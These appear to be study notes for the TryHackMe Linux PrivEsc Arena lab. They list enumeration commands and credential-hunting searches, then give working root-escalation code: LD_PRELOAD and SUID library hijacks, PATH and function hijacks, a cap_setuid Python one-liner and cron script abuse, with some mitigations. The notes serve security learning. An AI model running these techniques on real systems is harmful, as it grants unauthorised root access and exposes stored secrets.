TryHackMe LinuxPrivesc Arena: `ssh -oHostKeyAlgorithms=+ssh-dss TCM@10.10.x.x`

## Enumeration is the key.
Privilege escalation is all about:

*    Collect - Enumeration, more enumeration and some more enumeration.
*    Process - Sort through data, analyse and prioritisation.
*    Search - Know what to search for and where to find the exploit code.
*    Adapt - Customize the exploit, so it fits. Not every exploit work for every system "out of the box".
*    Try - Get ready for (lots of) trial and error.

[Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

[Got Milk](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

[Sushant](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html)


## Checklists

### Kernel and Distribution Release Details
- System Information:
- Hostname (`hostname`)

### Networking Details
- Current IP (`ip -br a, hostname -I`)
- Default route details (`ip route show`)
- DNS server information (`cat /etc/resolv.conf`)

### User Information
- Current user details (`whoami`)
- Last logged on users (`last -n 10`)
- Shows users logged onto the host (`who`)
- List all users including UID/GID information (`cat /etc/passwd`)
- List root accounts (`awk -F: '$3 == 0 { print $1 }' /etc/passwd`)
- Extracts password policies and hash storage method information (`cat /etc/login.defs | grep -i pass`)
- Checks umask value (`umask`)
- Checks if password hashes are stored in /etc/passwd (`grep -v 'x' /etc/passwd`)
- Extract full details for 'default' UIDs such as 0, 1000, 1001 etc. (`id 0 1000 1001`)
- Attempt to read restricted files i.e. /etc/shadow (`ls -l /etc/shadow`)
- List current users' history files (i.e. .bash_history, .nano_history, .mysql_history, etc.) (`ls -la ~/.*history`)
- Basic SSH checks (`cat /etc/ssh/sshd_config`)

### Privileged Access
- Which users have recently used sudo (`journalctl _COMM=sudo | tail -n 10`)
- Determine if /etc/sudoers is accessible (`cat /etc/sudoers`)
- Determine if the current user has sudo access without a password (`sudo -l`)
- Are known 'good' breakout binaries available via sudo (i.e. nmap, vim etc.) (`sudo -l`)
- Is root's home directory accessible (`ls -ld /root`)
- List permissions for /home/ (`ls -ld /home/*`)

### Environmental Information
- Display current `$PATH` (`echo $PATH`)
- Displays env information (`printenv`)

### Jobs/Tasks
- List all cron jobs (`crontab -l; ls -l /etc/cron.*`)
- Locate all world-writable cron jobs (`find /etc/cron* -type f -perm -o+w`)
- Locate cron jobs owned by other users of the system (`ls -l /etc/cron*`)
- List the active and inactive systemd timers (`systemctl list-timers`)

### Services
- List network connections (TCP & UDP) (`ss -tulpn`)
- List running processes (`ps aux`)
- Lookup and list process binaries and associated permissions (`ls -l $(which process_name)`)
- List inetd.conf/xined.conf contents and associated binary file permissions (`cat /etc/inetd.conf 2>/dev/null`)
- List init.d binary permissions (`ls -l /etc/init.d/`)

### Version Information (of the following):
- Sudo (`sudo --version`)
- MYSQL (`mysql --version`)
- Postgres (`psql --version`)
- Apache (`apachectl -v`)
- Checks user config (`cat ~/.bashrc`)
- Shows enabled modules (`apachectl -M`)
- Checks for htpasswd files (`find / -name ".htpasswd" 2>/dev/null`)
- View www directories (`ls -la /var/www/`)

### Default/Weak Credentials
- Checks for default/weak Postgres accounts (`psql -U postgres -c "\du"`)
- Checks for default/weak MYSQL accounts (`mysql -u root -e "SELECT User,Host FROM mysql.user;"`)

### Searches
- Locate all SUID/GUID files (`find / -perm -4000 2>/dev/null`)
- Locate all world-writable SUID/GUID files (`find / -perm -o+w -type f 2>/dev/null`)
- Locate all SUID/GUID files owned by root (`find / -uid 0 -perm -4000 2>/dev/null`)
- Locate 'interesting' SUID/GUID files (i.e. nmap, vim etc.) (`find / -perm -4000 -type f -name 'nmap' 2>/dev/null`)
- Locate files with POSIX capabilities (`getcap -r / 2>/dev/null`)
- List all world-writable files (`find / -perm -o+w -type f 2>/dev/null`)
- Find/list all accessible *.plan files and display contents (`find / -name "*.plan" -exec cat {} \; 2>/dev/null`)
- Find/list all accessible *.rhosts files and display contents (`find / -name ".rhosts" -exec cat {} \; 2>/dev/null`)
- Show NFS server details (`cat /etc/exports`)
- Locate .conf and .log files containing a keyword supplied at script runtime (`grep -irl "keyword" /etc/*.conf /var/log/ 2>/dev/null`)
- List all *.conf files located in /etc (`find /etc -name '*.conf'`)
- Locate mail (`ls -l /var/mail/`)

### Platform/Software Specific Tests
- Checks to determine if we're in a Docker container (`grep -q docker /proc/1/cgroup && echo Running in Docker`)
- Checks to see if the host has Docker installed (`docker --version`)
- Checks to determine if we're in an LXC container (`grep -q lxc /proc/1/cgroup && echo Running in LXC`)



## Some more Enumeration:
* System Enum: `cat/proc/version`, `cat /etc/issue`,  `uname -a` , `lscpu`...
* What Services are running? Who is the owner? `ps -aux | grep root`

## Password Hunting with Grep:
* `grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null`
* `locate password | more`
* `find / -name id_rsa 2> /dev/null`

## Automated Tools:
* [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [LinEnum](https://github.com/rebootuser/LinEnum)
* [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
* [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker)

## Sudo Overview Shell escaping:
**GTFOBins:** [Shell escaping techniques](https://gtfobins.github.io/)
```sh
sudo vim -c ':!/bin/sh'
```

## Sudo LD_PRELOAD Exploitation
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
```sh
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so apache2
id
```

## SUID Exploitation
```sh
find / -type f -perm -04000 -ls 2>/dev/null
```
```c
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
```sh
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/.config/libcalc.c
/usr/local/bin/suid-so
id
```

## Exploiting CVE-2016-1247
```sh
./nginxed-root.sh /var/log/nginx/error.log
```
```sh
invoke-rc.d nginx rotate > /dev/null 2>&1
```

## Symlink & Environment Variable Exploit



* In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
* From the output, make note of all the SUID binaries.
* In command prompt type: `strings /usr/local/bin/suid-env`
* From the output, notice the functions used by the binary.

## Exploitation

* In command prompt type:
```sh
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```
* In command prompt type: 
```sh
gcc /tmp/service.c -o /tmp/service
```
* In command prompt type: 
```sh
export PATH=/tmp:$PATH
```
* In command prompt type: 
```sh
/usr/local/bin/suid-env
```
* In command prompt type: 
```sh
id
```


* In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
* From the output, make note of all the SUID binaries.
* In command prompt type: `strings /usr/local/bin/suid-env2`
* From the output, notice the functions used by the binary.

## Exploitation ENV2



* In command prompt type:
```sh
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
```
**Explanation:** This function overrides the default `/usr/sbin/service` command. Instead of executing the intended service, it copies `/bin/bash` to `/tmp/`, assigns it SUID permissions, and executes it with elevated privileges.
* In command prompt type:
```sh
export -f /usr/sbin/service
```
**Explanation:** This command ensures that our malicious function is exported to the environment so that it gets executed when `/usr/local/bin/suid-env2` calls `service`.
* In command prompt type:
```sh
/usr/local/bin/suid-env2
```
**Explanation:** Since `suid-env2` runs as root and calls `/usr/sbin/service`, our function is executed instead, allowing us to escalate privileges.
* In command prompt type:
```sh
id
```
**Explanation:** This verifies that we have gained root access.
* In command prompt type:
```sh
whoami
```
**Explanation:** Confirms that the user is now root, completing the privilege escalation attack.

## Summary of SUID-Based Privilege Escalation

SUID (Set User ID) is a special file permission in Linux that allows executables to run with the permissions of the file owner instead of the executing user. If an SUID binary is owned by root, it can be exploited to escalate privileges to root if misconfigured.
Key SUID Privilege Escalation Techniques

**Finding SUID Binaries**
    Use the following command to list all binaries with the SUID bit set:

```sh
find / -type f -perm -04000 -ls 2>/dev/null
```
Any SUID binary owned by root could be a potential target.

Identifying Vulnerabilities in SUID Binaries

Analyze the binary using strings:
```sh
    strings /path/to/suid-binary
```
    Look for calls to system(), execve(), or references to other commands.

Exploiting SUID Binaries

    Symlink & Environment Variable Exploit (as seen in suid-env2)
        Override a command that the SUID binary relies on by defining a custom function and exporting it.
        When the SUID binary executes the command, it runs the attacker’s function instead, leading to privilege escalation.

    SUID Binary Execution with Controlled Input
        If an SUID binary allows executing external commands, an attacker can inject a malicious command.

`/path/to/suid-binary "/bin/sh"`

LD_PRELOAD Exploit (Library Hijacking)

    If an SUID binary allows setting the LD_PRELOAD environment variable, an attacker can preload a malicious shared library:

```sh
echo 'void _init() { setgid(0); setuid(0); system("/bin/bash"); }' > exploit.c
gcc -shared -o /tmp/exploit.so -fPIC exploit.c
sudo LD_PRELOAD=/tmp/exploit.so /path/to/suid-binary
```
SUID Shell Injection (Direct File Execution)

    Copy bash to a writable directory and set the SUID bit:
```sh
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p
```



## Capabilities 

For the purpose of performing permission checks, traditional UNIX implementations distinguish two categories of processes: privileged processes (whose effective user ID is 0, referred to as superuser or root), and unprivileged processes (whose effective UID is nonzero). Privileged processes bypass all kernel permission checks, while unprivileged processes are subject to full permission checking based on the process’s credentials (usually: effective UID, effective GID, and supplementary group list). Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuser into distinct units, known as capabilities, which can be independently enabled and disabled. Capabilities are a per-thread attribute.



* In command prompt type: `getcap -r / 2>/dev/null`
* From the output, notice the value of the “cap_setuid” capability.

Exploitation


* In command prompt type:
`/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
* Enjoy root!


## Priv Esc Via Cron


## Understanding Cron Job Privilege Escalation
Cron jobs are scheduled tasks that run automatically in Linux. If a cron job is misconfigured to execute a script that a low-privileged user can modify, it can be abused for privilege escalation.

### Identifying Vulnerable Cron Jobs
To check system-wide cron jobs:
```sh
cat /etc/crontab
```
Example output:
```sh
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```
- These jobs run **every minute** (`* * * * *`) as **root**.
- The script `overwrite.sh` is executed **without an absolute path**, meaning the system searches for it in directories listed in `$PATH`, including user-writable locations.

### Exploiting a Writable Script
If `overwrite.sh` is writable by a low-privileged user, they can modify it to escalate privileges:
```sh
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
```
**Explanation:**
- This script **copies** `/bin/bash` to `/tmp/bash`.
- Sets the **SUID** bit (`chmod +s`), allowing it to always execute as root.

### Gaining Root Access
Once the cron job executes, the attacker runs:
```sh
/tmp/bash -p
```
**Verification:**
```sh
id
```
Example output:
```sh
uid=1000(TCM) gid=1000(user) euid=0(root)
```
The **effective user ID (`euid=0`) is root**, confirming privilege escalation.

## Why Does This Work?
- **Cron jobs execute scripts as root**.
- **No absolute path in the cron job** allows execution of user-controlled scripts.
- **Writable scripts in `$PATH`** enable privilege escalation.

## Mitigations
- **Use absolute paths** in cron jobs:
```sh
* * * * * root /etc/scripts/overwrite.sh
```
- **Restrict write access**:
```sh
chmod 700 /etc/scripts/
chown root:root /etc/scripts/overwrite.sh
```
- **Run cron jobs with least privileges**:
```sh
* * * * * user /home/user/script.sh
```
- **Monitor cron logs**:
```sh
grep CRON /var/log/syslog
```

**misconfigured cron jobs** can allow privilege escalation. Implementing security best practices can mitigate this risk.




## References

[Linux Privilege Escalation using Capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)

[SUID vs Capabilities](https://mn3m.info/posts/suid-vs-capabilities/)

[Linux Capabilities Privilege Escalation](https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099)

[TryHackMe Linux PrivEsc Arena](https://tryhackme.com/r/room/linuxprivescarena)
[Linux Privilege Escalation Techniques](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
[strace Documentation](https://man7.org/linux/man-pages/man1/strace.1.html)

